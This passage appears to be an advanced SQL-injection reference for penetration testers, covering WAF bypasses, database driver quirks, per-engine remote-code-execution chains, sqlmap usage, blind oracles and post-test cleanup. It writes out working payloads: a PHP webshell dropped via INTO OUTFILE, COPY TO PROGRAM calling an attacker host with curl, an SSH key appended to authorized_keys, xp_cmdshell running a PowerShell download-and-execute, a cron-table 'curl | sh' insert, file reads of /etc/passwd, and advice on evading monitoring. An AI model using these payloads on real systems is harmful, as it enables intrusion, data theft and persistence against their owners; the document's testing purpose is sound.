- **URL + gzip (Content-Encoding: gzip)**: WAF decodes URL but may not gunzip a body; app gunzips before parsing. Test with a gzip-compressed body containing the injection.
- **URL + Unicode escape**: WAF URL-decodes; app JSON-decodes an inner Unicode escape (`'`).
- **Chunked transfer encoding**: some WAFs de-chunk before inspection; some do not. A chunked body with the injection split across chunks may bypass a naive per-buffer scanner.

### First-mode vs fail-open fingerprinting

A WAF that fails open on parse error is more permissive than one that fails closed. Send deliberately-malformed inputs (invalid UTF-8, oversized headers, malformed JSON) and observe whether the request reaches the origin. If yes, the WAF fails open — parse-failure payloads are a general bypass class.

## Driver-Level Injection Depth

The base file covers pgjdbc CVE-2024-1597 (line-comment generation under `preferQueryMode=simple`). The class generalizes — any driver whose parameter-substitution mode inlines values into SQL text carries the same primitive shape under mode-specific preconditions. Fingerprint the driver mode before firing.

### PostgreSQL JDBC (pgjdbc)

- `preferQueryMode=simple` inlines parameters; `extended` (default) transports parameters as separate Bind messages
- **`autosave=always`** — driver wraps every statement in a `SAVEPOINT` for exception recovery; interacts with `preferQueryMode` and with server-side prepared statement caches in ways that have historically exposed cache-key confusion bugs
- **Cursor prefetch**: `defaultRowFetchSize` controls how the driver fetches; large fetch sizes may hold connections open in ways that widen a time-based measurement window

### MySQL Connector/J

- **`useServerPrepStmts=true`** is not the default on all versions; when `false`, the driver client-side-emulates prepared statements — parameters are inlined by the driver, not sent as separate protocol packets. Historically some emulation bugs allowed injection through the parameter itself when it contained specific byte sequences.
- **`allowMultiQueries=true`** enables stacked queries on a connection — one injection can execute multiple statements, dramatically expanding the RCE chain reach (`; SELECT ... INTO OUTFILE`, `; CREATE FUNCTION`).
- **`characterEncoding`** mismatch with the server produces silent double-encoding; combined with `allowMultiQueries`, this is a bypass vector on WAFs that inspect one charset.

### Microsoft JDBC / ODBC (mssql-jdbc, msodbcsql)

- **`sendStringParametersAsUnicode=false`** switches string params from `NVARCHAR` to `VARCHAR` — historically some collation-differential bugs exist where a WAF's inspection charset diverges from what the driver eventually sends. Rare in modern deployments but non-zero.
- **`selectMethod=cursor`** vs `direct` changes rowset semantics; cursor mode holds connection state that time-based extraction can leverage.

### Oracle JDBC (ojdbc8+)

- **`oracle.jdbc.defaultBatchValue`** controls batch inlining; large batches with mixed bound and unbound parameters have historically had escape bugs on specific driver-server version pairs. Fingerprint via `oracle.jdbc.driver.OracleDriver.getDriverVersion()` if you have JMX access; otherwise infer from server response timing.

### Native drivers

- **libpq (Postgres C)**: `PQexec` inlines; `PQexecParams` binds separately. Applications that mix the two on the same connection have historically had inheritance bugs — a `PQexec` after a `PQexecParams` may inherit prepared-statement state.
- **libmysqlclient**: analogous — `mysql_query` vs `mysql_stmt_bind_param`.
- **cx_Oracle** / **oracledb** (Python): `cursor.execute(sql, params_dict)` binds; `cursor.execute(sql % params)` inlines. Same shape.
- **rust `sqlx`, `tokio-postgres`, `rusqlite`**: all bind by default; the `query!` macro validates statically. Injection surface is exclusively the raw-string escape hatches (`sqlx::query(&format!(...))`).

### HikariCP / connection pool state pollution

- Java HikariCP and its equivalents cache PreparedStatement objects per connection; a SQLi that runs `SET` statements or opens implicit transactions leaves state on the connection. When Hikari returns the connection to the pool, the next borrower inherits the state. Documented poisoning classes: `SET search_path`, `SET ROLE`, `SET SESSION AUTHORIZATION`, `SET application_name`, `SET LOCAL TIMEZONE`, `PREPARE <name>` (leftover prepared statements).
- Some pools include a "test on borrow" query (`SELECT 1`, `SELECT 'x'`) that runs on every checkout — this does not reset session state; that requires an explicit `RESET ALL` (Postgres) or `mysql_reset_connection` (MySQL 5.7+).

### PgBouncer transaction pooling specifics

- Session-level state (temp tables, `SET`, prepared statements, LISTEN channels, cursors) does not survive across pooled transactions on PgBouncer transaction mode. Any injection depending on this state fails inconsistently — the first request in a transaction sees state from prior requests only if they were in the same transaction.
- Server-side prepared statements introduced in PgBouncer 1.21 partially close some of the caching leak surface but with configuration caveats — the `max_prepared_statements` setting caps how many are cached per server.

### Prepared-statement cache poisoning

Server-side prepared statement caches key by SQL text. When two application code paths generate the *same* prepared SQL text but with different intended bind parameters, and one path is attacker-influenced, the cache may serve a prepared statement compiled with different intent — an authorization confusion at the DB layer that is hard to detect and hard to remediate. This is rare, driver-version-specific, and worth investigating when the target uses aggressive statement caching (Hikari's `prepStmtCacheSize` tuned high, PgBouncer in transaction-pooling mode with statement caching).

## RCE Chain Depth

The base file lists the RCE-adjacent primitives per DBMS. Advanced execution requires the preconditions, the exact payload shape, and the follow-through.

### MySQL / MariaDB — `INTO OUTFILE` / `INTO DUMPFILE`

Preconditions (all four):
1. Session has `FILE` privilege (`SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%CURRENT_USER%'`)
2. `secure_file_priv` is unset (empty string) or set to a directory the target path lives under (`SELECT @@secure_file_priv`)
3. The target path is writable by the mysqld user (`/tmp/`, `/var/lib/mysql-files/` on Debian, sometimes the webroot)
4. The web server serves the file back under a known URL (else the write is invisible)

Payload:
```sql
UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

Once landed, drive execution through `?c=id` on the served path. Route the RCE post-exploitation ordering to `rce`.

MariaDB adds `INTO OUTFILE ... UNION SELECT ...` variants and, in some versions, `SELECT ... INTO S3 's3://...'` — an outbound S3 write from the DB, a chain into `cloud/aws.md` for the credential path.

### PostgreSQL — `COPY TO PROGRAM`

Preconditions:
1. Session is superuser (`SELECT current_setting('is_superuser')`)
2. PostgreSQL is 9.3+ (`COPY TO PROGRAM` introduced then)
3. No `pg_hba.conf` restriction on the calling user's role

Payload:
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker/x?$(id)'
```

Or, for a persistent shell:
```sql
COPY (SELECT 'ssh-rsa AAA... attacker@x') TO PROGRAM 'cat >> ~postgres/.ssh/authorized_keys'
```

Non-superuser paths:
- `pg_read_server_files`, `pg_write_server_files`, `pg_execute_server_program` are role attributes introduced in PostgreSQL 11 that split `COPY` privileges from generic superuser status — an account with `pg_execute_server_program` but not superuser can still `COPY TO PROGRAM`. Enumerate via `SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'MEMBER')`.
- The `dblink` extension can connect to a second PostgreSQL — if a second cluster is superuser-accessible under the same DB service account, the RCE lands there.

CockroachDB rejects `COPY TO PROGRAM` — do not report this chain against CockroachDB without engine verification (see Parser Differentials above).

### MSSQL — `xp_cmdshell`

Preconditions:
1. Session is `sysadmin` role (`SELECT IS_SRVROLEMEMBER('sysadmin')`)
2. `xp_cmdshell` is enabled (`SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'`)
3. If disabled, `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` enables it (permission-dependent)

Payload:
```sql
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker/x'')"'
```

Alternatives when `xp_cmdshell` is off:
- **OLE Automation** (`sp_OACreate`, `sp_OAMethod`) — if enabled, drives arbitrary COM objects including `WScript.Shell`
- **CLR** — `CREATE ASSEMBLY` with an attacker-controlled `.NET` DLL; requires `sysadmin` and `TRUSTWORTHY ON` or a signed assembly. The `xp_regread`/`xp_regwrite` extended procs read/write the Windows registry — indirect privilege escalation on some misconfigurations.

### Oracle — `UTL_FILE`, `DBMS_JAVA`, `DBMS_SCHEDULER`

- `UTL_FILE.PUT_LINE` writes to directories registered in `ALL_DIRECTORIES`; combine with a webroot-mapped directory to drop a webshell
- `DBMS_JAVA.SET_OUTPUT_TO_JAVA_UTIL_LOGGING` and other DBMS_JAVA procedures can execute Java when a Java procedure is created (`CREATE JAVA CLASS`) — requires JVM enabled in the DB
- `DBMS_SCHEDULER.CREATE_JOB` with `job_type => 'EXECUTABLE'` runs an OS command — requires `CREATE JOB` and the target executable's path

### SQLite

No native filesystem or exec primitives. Two paths:
- **`ATTACH DATABASE 'file:./x.db?mode=rwc' AS x`** — writes an SQLite database to arbitrary path. If the app subsequently reads a config from the same path (a phar-like configuration format), the write is exploitable.
- **App-layer bounce** — an SQLi that returns attacker-controlled bytes into a downstream sink (a template renderer, a `subprocess.run(...)`, a `eval()`) is where the RCE lands; the DB is not the exec sink.

### PostgreSQL UDF loading (C library)

Beyond `COPY TO PROGRAM`:
- **`CREATE FUNCTION ... LANGUAGE C AS '<library path>', '<symbol>'`** — loads a native C library and calls a symbol as a SQL function. Requires superuser and the library to already exist on the filesystem in a directory the postgres user can read.
- Chain: use `COPY (SELECT ...) TO '/tmp/x.so'` (superuser required, and the bytes must be a valid ELF — impractical for raw SQLi, but plausible if bytes are already on the filesystem via another primitive) then `CREATE FUNCTION` to load.
- **`lo_import`/`lo_export`** transfer files between the DB and the filesystem — a superuser SQLi can read arbitrary files off the DB host and export the postgres OS user's private keys.

### MSSQL — CLR / SQLCLR depth

- **`CREATE ASSEMBLY`**: loads a .NET DLL as bytes. `EXEC sp_add_trusted_assembly` (2017+) whitelists an assembly hash for `SAFE`/`EXTERNAL_ACCESS`/`UNSAFE` permission sets.
- The `UNSAFE` permission set allows unrestricted `System.IO`, `System.Diagnostics.Process`, and P/Invoke — effectively RCE.
- Preconditions: `sysadmin`, `TRUSTWORTHY ON` on the database (or an assembly signed with a trusted certificate), CLR enabled (`sp_configure 'clr enabled', 1`), CLR strict security bypassed (SQL Server 2017+ enables strict security by default; requires an assembly signature).
- The `sp_add_trusted_assembly` path modernizes the classic `TRUSTWORTHY ON` chain; both work on affected builds.

### Oracle — Java Stored Procedures depth

- **`CREATE JAVA CLASS`**: loads a Java class into the DB's JVM. `CREATE PROCEDURE ... AS LANGUAGE JAVA NAME '<class>.<method>(...)'` binds a SQL callable to a Java method.
- The Java method runs with the calling schema's Oracle permissions and, on affected builds, has access to `java.io`, `java.net`, and `java.lang.Runtime` — effectively RCE if `permissions` grants it.
- Preconditions: Java-enabled Oracle (some Standard Edition builds have it disabled), `CREATE PROCEDURE`, `CREATE JAVA CLASS`, and the appropriate `dbms_java.grant_permission` grants for the target packages.

### Container and sandbox-specific quirks

- **Databases in Kubernetes**: the DB pod's filesystem is usually ephemeral; a webshell dropped via `INTO OUTFILE` lives only until pod restart. Persistence requires writing to a mounted volume (`emptyDir` is ephemeral; `hostPath`, `PVC` are persistent). Enumerate `SELECT @@datadir` (MySQL), `SELECT current_setting('data_directory')` (Postgres) to see if the data directory is a volume mount.
- **Cloud-managed DBs (RDS, Cloud SQL, Azure SQL DB)**: no host filesystem access, no superuser account, `xp_cmdshell` disabled, `CREATE FUNCTION LANGUAGE C` disabled. Classical RCE chains do not work. The reach is cloud-service-shape — write to S3 via `aws_s3` extension on Aurora, `PUT` to a Snowflake stage, and so on. Chain to `cloud/*` for the credential-and-reach analysis.
- **Serverless DB (Neon, Turso, D1)**: no host, no OS. RCE-shape impact is exfiltration only; write primitives are limited to app-layer bounces.

### Analytics engines

- **Trino**: no filesystem exec, but `CREATE TABLE ... WITH (external_location = 's3://attacker-bucket/x')` reaches attacker-controlled S3 under the connector's IAM identity — either a data exfil primitive or a bucket-poisoning primitive
- **Snowflake**: `PUT` to a Snowflake stage; if the stage is a Snowflake-external S3/GCS with attacker write, and any pipeline consumes files from that stage, indirect execution follows
- **BigQuery**: `EXPORT DATA` writes to GCS under the query's SA; a service account with wide GCS write is a chain into `cloud/gcp.md`

## Chained-Primitive Exploitation

The base file names the primary chains at a high level. Advanced routes are specific and multi-hop:

### SQLi → auth bypass → session persistence → RCE

1. **Identifier-position bug** in a filter DSL (`?sort=` or a Django `_connector` predicate collapse) → auth bypass, admin session
2. **Admin session** enables reach to `/admin/actions/backup` or a similar high-privilege endpoint → the endpoint runs `mysqldump`/`pg_dump` on a config-controllable path → path traversal in the config value lands a file at the webroot
3. **Or**: admin session enables an `/admin/import` endpoint that runs a stored proc; the stored proc has `EXEC(@sql)` — an injection into the import metadata reaches the proc's `EXEC` for RCE
4. Route: `authentication_jwt` for post-auth persistence (token forgery if the app rotates on admin login), `broken_function_level_authorization` for the admin-endpoint reachability discipline, `rce` for the exec-sink ordering

### SQLi → SSRF via DB-side outbound → cloud credential

1. **PostgreSQL** `http` extension or `dblink` (or `UTL_HTTP` on Oracle, `sp_OACreate` on MSSQL) → outbound request from the DB node to `169.254.169.254/latest/api/token`
2. **DB-side outbound reaches metadata endpoint** — but IMDSv2 requires a `PUT` request with a `X-aws-ec2-metadata-token-ttl-seconds` header and honors a hop-limit (default 1). A `dblink`-shaped GET without headers cannot mint a token → IMDSv2 blocks the credential extraction. Route the reachability finding to `ssrf`, route the IMDSv2 credential-extraction gate to `cloud/aws.md` (which owns the PUT/hop-limit/header nuance).
3. **On IMDSv1 or on GCP/Azure where headers are simpler** — the DB-side outbound may extract the credential directly. `Metadata-Flavor: Google` on GCP is a single required header; `Metadata: true` on Azure similarly. Whether the DB-side outbound function can set headers is the load-bearing question — `PostgreSQL http_get` accepts a headers array on some builds; `MSSQL sp_OACreate` with `MSXML2.ServerXMLHTTP` accepts headers; `dblink` does not.
4. Chain: `ssrf` for the reach catalog, `cloud/aws.md` / `cloud/gcp.md` / `cloud/azure.md` for the credential-extraction gate.

### SQLi → stored XSS → admin-context session hijack

1. **Value-position SQLi** on a write endpoint stores an XSS payload into an admin-facing display field
2. **Admin loads the dashboard** — the stored XSS fires in the admin's browser
3. **Admin's session cookie or the admin's active CSRF token** exfiltrates via OAST
4. Route: `xss` for the client-side chain post-XSS, `csrf` for the token replay, `authentication_jwt` for post-hijack persistence

### SQLi → file write → deserialization chain → RCE

1. **File write primitive** (MySQL `INTO OUTFILE`, Postgres `COPY`) drops a serialized-object file at a path the app deserializes on next boot or on a specific request
2. The **deserialization gadget** fires when the app reads the file — chain into `insecure_deserialization` for gadget selection
3. Route: `insecure_deserialization` for the gadget-chain surface, `rce` for the post-exploitation ordering

### SQLi → schema modification → persistence

1. **UPDATE-shape SQLi** rewrites a config table (`SET is_admin=1 WHERE id=<attacker>`) or a scheduled-jobs table (`INSERT INTO cron_jobs (cmd) VALUES ('curl attacker/x | sh')`)
2. **The persistence sink** fires on the app's own cadence — a cron table read by a cron worker, a config re-read on next request, a webhook table iterated on next event
3. Chain: hand persistence-shape findings to the framework-specific skill (`frameworks/django.md`, `frameworks/nextjs.md`, etc.) since the persistence sinks are framework-defined

### SQLi → XXE via XML sinks

1. **`MSSQL nodes()`/`.query()`** on an attacker-controlled XML fragment: `SELECT @x.query('/root/*')` where `@x` is an `xml`-typed variable populated from injection — a DTD reference to an external system entity fires under the DB's XML parser
2. **MySQL `LOAD_XML`** with a `LOCAL` file argument: `LOAD XML LOCAL INFILE '/etc/passwd' INTO TABLE t` reads server-side files when `local_infile=1`
3. **Oracle `XMLType`** constructor takes an XML string; external entity expansion is engine-configuration-dependent — check `SELECT * FROM V$PARAMETER WHERE NAME LIKE '%xml%'`
4. Chain: route to `xxe` for the XML-specific extraction catalog once the XML sink is confirmed

### SQLi → LFI / arbitrary file read

1. **MySQL `LOAD_FILE('/etc/passwd')`** — requires `FILE` privilege and `secure_file_priv` unset; returns the file contents into a SELECT
2. **PostgreSQL `pg_read_server_file('/etc/passwd')`** — requires superuser or the `pg_read_server_files` role
3. **MSSQL `OPENROWSET(BULK ...)`** with `SINGLE_CLOB` reads a file as a single string; requires `ADMINISTER BULK OPERATIONS` and file access
4. **Oracle `DBMS_LOB.LOADBLOBFROMFILE`** with a directory object — requires `READ` on the directory
5. Chain: route to `path_traversal_lfi_rfi` for the file-selection heuristics (which config files hold secrets, which private keys live at which paths per OS)

### SQLi → DoS chains

Not the primary goal, but plausible side effects worth being explicit about:
- **Table locks**: `LOCK TABLE users IN EXCLUSIVE MODE` (Postgres) held for the duration of a long transaction blocks all writes to `users`
- **Recursion depth**: `WITH RECURSIVE t AS (SELECT 1 UNION ALL SELECT n+1 FROM t) SELECT * FROM t LIMIT 1000000` consumes memory
- **Query planner exhaustion**: many joins with no indexes force a planner catalog scan
- Report DoS-adjacent findings with restraint; do not fire them on production without explicit authorization and rollback

### SQLi → observability leak

1. **`information_schema`/`pg_stat_activity`/`sys.dm_exec_requests`** leak recent queries, some of which include bound parameters (passwords, tokens) if the app logs them
2. **`pg_stat_statements`** aggregates recent SQL text; on some builds includes parameter values
3. **`SHOW PROCESSLIST`** on MySQL similarly
4. A SQLi that reaches these leaks other users' recent activity, sometimes including auth tokens — a horizontal-tenant leak in multi-tenant systems

## Advanced Detection Methodology

### Differential blind extraction under noise

For a boolean channel across a jittery target:
1. Send both `true`-shape and `false`-shape requests interleaved (`T F T F T F` or `T F F T`)
2. Median-of-medians: for each response feature (body length, ETag, status, response time), compute per-shape median across 5 samples
3. The feature with the largest between-shape MAD is the oracle; features whose within-shape variance exceeds between-shape variance are noise
4. Retry with fewer features and more samples if none exceed the threshold

Response-body normalization before diffing: strip timestamps, request IDs, CSRF tokens, `<script nonce=...>` values, and per-request pagination cursors. `diff --ignore-all-space` on the tokenized shape rather than raw bytes.

### Response splitting for extraction bandwidth

When a UNION SELECT returns visible rows but rate-limits or WAF-blocks past N rows, spread extraction across pages:
- Injection includes `LIMIT ? OFFSET ?` where both are attacker-controlled
- One HTTP request per row (or per K rows, batching within N-per-page limit)
- Concurrency budget: 2–4 parallel requests to stay under rate limits; the WAF's rate-limit key is typically IP + endpoint + method

For asynchronous OAST extraction, no rate limit applies to the OAST side; the rate limit is the DB-outbound side. Some engines rate-limit `UTL_HTTP` or `http_get` per session; a new session per batch may reset the count.

### Confidence and confirmation discipline

Advanced targets have adversarial monitoring. A finding is confirmed when:
- **Oracle reproducibility**: 5-of-5 or 4-of-5 confirmations across repeated payloads
- **Scaling**: the observable (time, cost, byte count, DNS labels) scales with the injected parameter (delay N, LIMIT N, subquery cardinality)
- **Uniqueness**: the observable identifies *this* injection, not a background signal — nonce prefixes, unique CIDR labels in OAST, unique per-request markers in EXPLAIN output
- **Reversibility**: the injection can be undone; a state change made by the test can be rolled back cleanly

An advanced-target report includes the confidence discipline — the reviewer's confidence tracks the evidence shape and the discipline, not the payload's aesthetics.

### Clustering and histogram oracles for very noisy channels

When neither median-of-medians nor scaling-with-N works cleanly:
- **Histogram the response-time distribution** across 30+ samples per shape. Two shapes (true/false) with genuinely-different underlying distributions show a bimodal joint histogram; overlapping unimodal distributions mean the channel is not usable at that sample count.
- **DBSCAN** on `(response-time, response-length)` pairs — density-based clustering identifies which requests belong to the same shape even under heavy jitter, without requiring the tester to specify cluster count.
- **Change-point detection** on a time-series of response times: when the injection begins, does the distribution's mean shift? A change-point that aligns temporally with the injection is corroborating evidence.
- Reserve statistical approaches for cases where naive methods have failed 5+ times; the compute cost is not worth it against a normally-behaving target.

### Adversarial and monitored-target discipline

Some targets are honeypots, some run canary detection, some have SIEM alerting keyed on SQL-injection signatures. Advanced discipline:
- **Signature diversity**: rotate between payload dictionaries; do not send the same 50 sqlmap payloads if the target is monitored
- **Timing spread**: introduce human-like inter-request delays (100–2000ms exponential jitter) rather than sending as fast as the client can
- **Session and user-agent rotation**: reduce correlation risk across sessions
- **Read-only preference**: prefer SELECT over UPDATE/INSERT/DELETE unless the finding requires the mutation; avoid schema-modifying statements
- **State restoration**: for any state change the test made (a stored payload, a modified row, a created table), document the rollback and execute it before disengaging

## Multi-Tenant Isolation Attacks

When a target uses PostgreSQL Row-Level Security (RLS), MSSQL Row-Level Security, or schema-per-tenant isolation, SQLi carries a distinct additional class: escaping the tenant boundary.

### PostgreSQL RLS bypass classes

- **`SET ROLE` under superuser** — an injection that reaches `SET ROLE postgres` (superuser) bypasses RLS entirely; RLS policies are enforced against `current_user`, and superuser is exempt on all policies unless `FORCE ROW LEVEL SECURITY` is set on the table
- **`SET row_security = off`** — a session GUC that superuser or table owners can set; RLS is skipped for that session
- **Policy hole via `USING (true)` on write** — a table with an RLS `USING` clause but no `WITH CHECK` clause allows INSERTs to any tenant's rows
- **Policy hole via `LEAKPROOF` violation** — a function marked `NOT LEAKPROOF` may execute before the RLS filter, leaking side channels; look for `EXPLAIN` plans that show the function running below the filter

### MSSQL RLS bypass classes

- **`sys.fn_row_level_security_policy_disabled` = 1** — session-level disable, requires ALTER on the SECURITY POLICY
- **Missing block predicate** — like PG's `WITH CHECK` gap, an MSSQL RLS with only a filter predicate allows cross-tenant writes
- **Bulk operations bypass** — `BULK INSERT` and `SqlBulkCopy` historically bypassed RLS on some versions

### Schema-per-tenant escape

When each tenant lives in a distinct schema (`tenant1.users`, `tenant2.users`) and the app selects the schema via `SET search_path TO tenant1`:
- An injection that reaches `SET search_path TO tenant2` reads cross-tenant
- A `SELECT * FROM tenant2.users` bypasses the search_path entirely if the calling role has `USAGE` on the other schema (frequent misconfiguration in "isolated" multi-tenant setups)

### `information_schema` cross-tenant leak

`information_schema` is not schema-scoped — a SELECT against `information_schema.tables` or `information_schema.columns` reveals every schema the calling role has any privilege on. On a multi-tenant setup where roles are granted per-schema, a SQLi that lists `information_schema` reveals every co-resident tenant.

## DB-Side Audit Evasion — Fingerprinting, Not Bypass

Documenting what an audit captures so the report can distinguish "test not captured" from "test captured but not alerted":

### PostgreSQL `pgaudit`

- Logs class-selected statements (READ/WRITE/DDL/etc.) with the statement text and parameter values (when `pgaudit.log_parameter = on`)
- Captures via `log_statement`/`log_min_duration_statement` — different capture path with different filtering
- What is not captured by default: bind parameters in extended-query mode when `pgaudit.log_parameter = off` (the default) — a bind-based injection has plaintext SQL in the log but not the injected value

### MySQL Enterprise Audit / MariaDB Audit Plugin

- Log every SQL statement text (default); `audit_log_policy = LOGINS` reduces to auth events only
- Rotate on file size; a target with small rotation and no shipping loses audit history quickly
- `audit_log_format = JSON` vs OLD/NEW: the JSON format preserves parameter values in a machine-readable form suitable for SIEM ingestion

### MSSQL SQL Audit

- Server audit + database audit specifications, each with an action group
- `SCHEMA_OBJECT_ACCESS_GROUP` captures SELECT/INSERT/UPDATE/DELETE with the query text
- Query text captured includes the compiled statement, so identifier-position injections show the crafted identifier

### Oracle Unified Audit

- Predefined and custom policies; `AUDIT SELECT ON <table>` captures each SELECT with SQL text
- FGA (Fine-Grained Auditing) via `DBMS_FGA.ADD_POLICY` captures based on column-value predicates — a SQLi that manipulates the predicate to avoid the FGA condition slips the FGA capture but is still caught by generic audit

### Fingerprinting the capture

- Enumerate what audit is on via `SELECT ... FROM pg_settings WHERE name LIKE 'pgaudit%'` (PG), `SELECT @@global.audit_log_policy` (MySQL), `SELECT * FROM sys.dm_server_audit_status` (MSSQL), `SELECT * FROM DBA_AUDIT_POLICIES` (Oracle)
- Not evasion — a documented finding notes what the audit captured about the test, and the test is not attempting to hide

## Grammar-Guided Payload Synthesis

Where the WAF's regex is too tight for hand-crafted variants and manual iteration stalls:

- **PortSwigger sqlmap tamper scripts** are the accessible entry: hand-written per-technique transformations (`between`, `charunicodeencode`, `space2comment`, `randomcase`). Chain them: `--tamper=between,space2comment,randomcase`.
- **Custom tamper**: write a Python tamper that generates a differential transformation the WAF's regex misses. Sqlmap loads it from `--tamper=your_module.py`. Iterate against a local WAF instance if available; against a production WAF, the iteration cost is high — cache tamper effectiveness.
- **Grammar fuzzers** (`sqlsmith`, `Squirrel`) generate valid SQL per engine's grammar; feed them to a target to discover parser accepts that a WAF misses. Sqlsmith targets PostgreSQL, MySQL, SQLite grammars.
- **Genetic algorithms on payload space**: reward WAF-passed payloads that produce oracle differentials. Framework: `WAF-A-MoLE` and similar research projects — check against your target's WAF class before assuming published results transfer.

The advanced-tier discipline is to know when grammar-guided synthesis is worth the compute: only after the manual axis-at-a-time approach has been exhausted, only when the target is important enough to justify the WAF-alert noise, and only when the target's WAF is one the synthesis tooling has training data for.

## Sqlmap Operational Depth

Beyond the base file's flag catalog, the advanced operational surface:

- **Injection point selection**: `-p` restricts to a parameter list; `--skip` excludes known-safe params; `--url-safe-chars` prevents encoding of specified characters that the target's routing requires literal
- **DBMS-specific tuning**: `--dbms=postgresql --tech=T` for time-based only on PG; `--os=linux` narrows OS-specific payloads
- **Threading and jitter**: `--threads=1 --delay=0.5 --time-sec=10` is the noisy-target profile; `--threads=10` is aggressive
- **Tampering chains**: `--tamper=between,space2comment,charunicodeencode` — order matters (encoding usually last)
- **Cookie/header injection**: `--cookie 'a=1;b=INJECT'` or `--headers 'X-Real-IP: INJECT'`
- **JSON body**: `-r request.txt` with the raw request; sqlmap detects `Content-Type: application/json` and probes appropriate positions
- **GraphQL**: `-r request.txt` again; identify a resolver arg that reaches SQL and mark it with `--data='...' -p 'json:variables.arg'`
- **Second-order**: `--second-url=<observing URL>` sends the injection to URL A and observes URL B for the response oracle
- **Out-of-band**: `--dns-domain=<attacker domain>` uses DNS as the extraction channel (requires DNS server authority)
- **Sqlmapapi**: `sqlmapapi -s` runs the server, `sqlmapapi -c` runs the client — useful for orchestrated scans from a controller
- **`--file-read`/`--file-write`/`--os-shell`/`--os-pwn`**: high-impact flags; verify the DBMS supports the primitive before invoking; on production only with explicit authorization

Trap: `--batch` skips interactive confirmations that sometimes ask about high-risk operations. Read the prompts on the first run against a target; then automate.

## Blind Boolean Channels Beyond Response Body

Body-length and status-code diffs are the base channels. When the response body is entirely masked (a generic error page, a redirect, a WAF page), other oracles remain:

- **Redirect target** — `Location: /login?redir=<url>` where the URL varies with predicate truth (a role check landing on `/admin` vs `/dashboard`)
- **Cookie set/unset** — `Set-Cookie: session_role=admin` when the predicate is true
- **CSP nonce** — a `<script nonce=...>` in a subsequent request differs when the app regenerated the nonce due to state change; usable if the nonce is exposed in a response the tester can read
- **Cache directives** — `Cache-Control: max-age=X` where X is derived from a DB value the injection influences
- **ETag / Last-Modified** — content-derived etags differ when the underlying row changed; a predicate-driven UPDATE produces observable etag drift
- **Response HTTP version** — some proxies downgrade HTTP/2 to HTTP/1.1 based on response size; a payload that changes body size beyond a threshold shifts the response version
- **TLS session resumption** — a fresh TLS handshake vs a session-ticket resume differs by ~100 bytes on the wire and by observable timing; a state change that invalidates a session token forces a fresh handshake on the next request
- **Server-side event or WebSocket message** — some apps push a message on state change; watching a WebSocket during injection reveals the fire

Multiple oracles reduce required sample count. A confirmation using two independent oracles (body diff and cookie diff) reaches confidence in half the sample count of either alone.

## Post-Exploitation State Discipline

After a confirmed finding, disengagement discipline reduces evidence pollution and legal risk:

- **Rollback**: any INSERT/UPDATE/DELETE performed as part of confirmation is rolled back. Preferred: wrap the test in a transaction that is explicitly rolled back. Second-best: after commit, execute a targeted UPDATE/DELETE that restores the state, and confirm by re-reading.
- **Cleanup**: remove any files written to disk via `INTO OUTFILE`/`COPY TO PROGRAM`/`UTL_FILE`. Confirm removal by re-reading (`SELECT LOAD_FILE(...)` returns NULL when the file is gone).
- **Session and prepared-statement cleanup**: on pooled DBs, execute `RESET ALL` (Postgres) or `mysql_reset_connection()` (MySQL) equivalent from the app if reachable; if not, leave a note that connection-pool state may be affected until the next pool cycle.
- **Access token invalidation**: if the finding involved credential extraction (metadata endpoint, DB credential file), rotate or invalidate as soon as the client's incident response permits — the credential is presumed compromised whether or not it was used.
- **Log honesty**: the target's logs will show the test; do not attempt to erase them (that itself is a finding class the target's team may want to review). Instead, coordinate the disclosure so the log entries can be attributed to authorized testing rather than an authorized attack — every payload lives with a nonce prefix that the disclosure can cite.
- **Reversible test cases**: every payload documented in the finding report has a paired "how to observe the fix worked" negative case — the same payload against a patched version should produce the fix-signature error (as with the Django `TypeError`/`ValueError` measurement discipline).

Per-engine rollback templates:

```sql
-- PostgreSQL: prefer transaction-wrapped tests
BEGIN;
  -- ... injection / mutation ...
ROLLBACK;

-- If the test committed, restore via targeted revert:
UPDATE users SET is_admin = false WHERE username = 'test-nonce-8a3f9c';
DELETE FROM audit_log WHERE payload LIKE '%test-nonce-8a3f9c%';
```

```sql
-- MySQL: engine matters — MyISAM does not support transactions
-- Confirm InnoDB (default 5.6+) via:
SELECT engine FROM information_schema.tables WHERE table_name = 'users';
-- Under InnoDB:
START TRANSACTION;
  -- ... injection ...
ROLLBACK;
```

```sql
-- MSSQL: BEGIN TRAN / ROLLBACK
BEGIN TRAN;
  -- ... injection ...
ROLLBACK TRAN;
```

```sql
-- Oracle: SAVEPOINT + ROLLBACK TO
SAVEPOINT before_test;
  -- ... injection ...
ROLLBACK TO SAVEPOINT before_test;
```

```sql
-- SQLite: BEGIN TRANSACTION / ROLLBACK, similar shape
BEGIN TRANSACTION;
  -- ...
ROLLBACK;
```

File cleanup templates:

```sql
-- MySQL: no direct file-delete primitive. Overwrite the file with an empty output:
SELECT '' INTO OUTFILE '/var/www/html/shell.php';
-- (Requires FILE privilege and the same path being writable; may need target OS rm.)

-- PostgreSQL superuser cleanup:
COPY (SELECT '') TO PROGRAM 'rm /var/www/html/shell.php';

-- MSSQL:
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\shell.aspx';
```

Session-state cleanup on pooled connections:

```sql
-- PostgreSQL — clears SET, prepared statements, LISTEN, cursors
RESET ALL;
DISCARD ALL;

-- MySQL — clears session variables
RESET QUERY CACHE;
FLUSH STATUS;
-- mysql_reset_connection() is a C-API call; if only SQL is available, close and reopen the connection.
```

## Overlap Notes

- **Framework-specific expressions** — Django `Q()._connector` and `FilteredRelation`, Rails `.order(params[:sort])`, MyBatis `${column}` — live in the base file's Framework and Query-Builder Sink Catalog and in each `frameworks/*.md` file per the Option B pattern. This advanced sibling does not duplicate them; it points back to the base and to the framework files as the residuals require the framework-specific context.
- **The Busboy/Vercel WAF multipart parser-differential class** — canonical block lives at `ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block. This file's Encoding-boundary bypasses section references it by filename.
- **NoSQL injection** — the boundary is Cassandra CQL / Mongo aggregation / Redis EVAL. Routed to `nosql_injection` when the target speaks a non-SQL query language; do not extend SQL techniques into NoSQL sinks without checking the parser first.
